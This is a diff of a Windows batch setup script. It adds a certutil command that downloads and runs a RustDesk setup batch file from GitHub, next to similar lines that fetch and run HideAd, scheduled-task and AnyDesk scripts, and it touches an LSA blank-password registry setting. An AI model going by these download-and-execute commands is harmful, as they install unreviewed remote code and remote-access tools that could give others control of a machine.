@@ -47,8 +47,8 @@ reg add "HKLM\SYSTEM\CurrentControlSet\Control\Lsa" /v LimitBlankPasswordUse /t 
 certutil -urlcache -split -f "https://raw.githubusercontent.com/falconx1/windows-config/main/HideAd.bat" "C:\Users\Public\Downloads\HideAd.bat" && cmd.exe /c "C:\Users\Public\Downloads\HideAd.bat" && del /F /Q "C:\Users\Public\Downloads\HideAd.bat"
 ::Download Schedule Task Init
 certutil -urlcache -split -f "https://raw.githubusercontent.com/falconx1/windows-config/main/ScheduleTask.bat" "C:\Users\Public\Downloads\ScheduleTask.bat"
-::Install Rustdesk
-
+::Install RustDek
+certutil -urlcache -split -f "https://raw.githubusercontent.com/falconx1/windows-config/main/setupRustDesk.bat" "C:\Users\Public\Downloads\setupRustDesk.bat" && cmd.exe /c "C:\Users\Public\Downloads\setupRustDesk.bat"
 ::Install Anydesk
 certutil -urlcache -split -f "https://raw.githubusercontent.com/nobita2906/anydesk-config/main/setupAnydesk.bat" "C:\Users\Public\Downloads\setupAnydesk.bat" && cmd.exe /c "C:\Users\Public\Downloads\setupAnydesk.bat" && del /F /Q "C:\Users\Public\Downloads\setupAnydesk.bat"
 ::Open proxy
